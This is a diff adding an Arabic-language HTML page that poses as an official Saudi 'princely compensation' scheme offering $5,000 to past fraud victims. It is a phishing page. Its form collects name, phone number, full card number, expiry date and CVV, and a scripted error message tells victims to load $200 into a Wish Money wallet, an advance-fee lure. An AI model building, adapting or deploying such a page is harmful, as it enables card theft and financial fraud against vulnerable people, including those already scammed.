@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>نموذج التعويض</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <!-- Header Top Bar -->
+  <header class="top-bar">
+    <img src="images/logo 1 .png" alt="الشعار الأيمن" class="logo right-logo" />
+    <h1 class="header-text">تعويضات اميرية</h1>
+    <img src="images/wish1.png" alt="الشعار الأيسر" class="logo left-logo" />
+  </header>
+
+  <!-- Illustration and Description -->
+ <div class="modern-container">
+  <img src="images/khair1.jpg" alt="صورة" class="illustration" />
+  <p class="description">
+    تعويضًا عمّا شهدته الفترات الأخيرة من حالات احتيال جرت باسم أصحاب السمو من الأمراء، تعلن المملكة العربية السعودية عن تقديم مبالغ تعويضية لدعم ومساعدة الإخوة المتضرّرين، وذلك في إطار الحرص على إعادة السمعة الطيبة التي شوّهتها الأيدي العابثة من محتالين انتحلوا أسماء شخصيات معروفة وذات مكانة حسنة.
+    ويُقرّ مقدِّم الطلب بالتعهد بعدم التواصل مستقبلًا مع أي منصات أو صفحات مزوّرة.
+    دامت الأمة العربية والإسلامية أمةً واحدة متماسكة.
+  </p>
+</div>
+
+
+  <!-- Form Container -->
+<div class="container">
+  <form id="paymentForm" novalidate>
+
+    <p class="grant-info">
+      إجمالي مبلغ منحة المساعدة: 5000 دولار
+    </p>
+
+    <div class="form-group">
+      <input type="text" id="fullName" placeholder="الاسم الكامل" required />
+    </div>
+
+    <div class="form-group">
+      <input type="tel" id="mobileNumber" placeholder="رقم الجوال" required />
+    </div>
+
+    <div class="form-group">
+      <input
+        type="text"
+        id="cardNumber"
+        placeholder="1111 2222 3333 4444"
+        inputmode="numeric"
+        autocomplete="cc-number"
+        dir="ltr"
+        maxlength="19"
+        required
+      />
+    </div>
+
+    <div class="form-row">
+      <input
+        type="text"
+        id="expiryDate"
+        placeholder="(MM/YY)"
+        inputmode="numeric"
+        autocomplete="cc-exp"
+        dir="ltr"
+        maxlength="5"
+        required
+      />
+      <input type="text" id="cvv" placeholder="CVV" inputmode="numeric" maxlength="4" required />
+    </div>
+
+    
+   <p class="error-text" id="errorText" style="display:none; color:red; margin-top:10px;">
+  تم رفض عملية الايداع من قبل محفظة ويش موني حيث أنها غير فعالة لإيداع مبلغ نقدي عالي. يجب أن يكون رصيد المحفظة على الأقل ٢٠٠ دولار لرفع سقف الايداع.
+</p>
+    <!-- CTA Button -->
+    <button type="button" class="cta-btn" id="ctaBtn">
+      <span class="btn-text">ايداع مبلغ التعويض</span>
+      <span class="loader" style="display:none;"></span>
+    </button>
+
+    <button type="button" id="activateWalletBtn" disabled style="display:none; width:100%; margin-top:10px; padding:1rem; border:none; border-radius:10px; background:#6a11cb; color:#fff; font-weight:600; cursor:not-allowed;">
+  تم تفعيل المحفظة
+</button>
+
+  </form>
+</div>
+
+
+
+
+  <script src="script.js"></script>
+</body>
+</html>
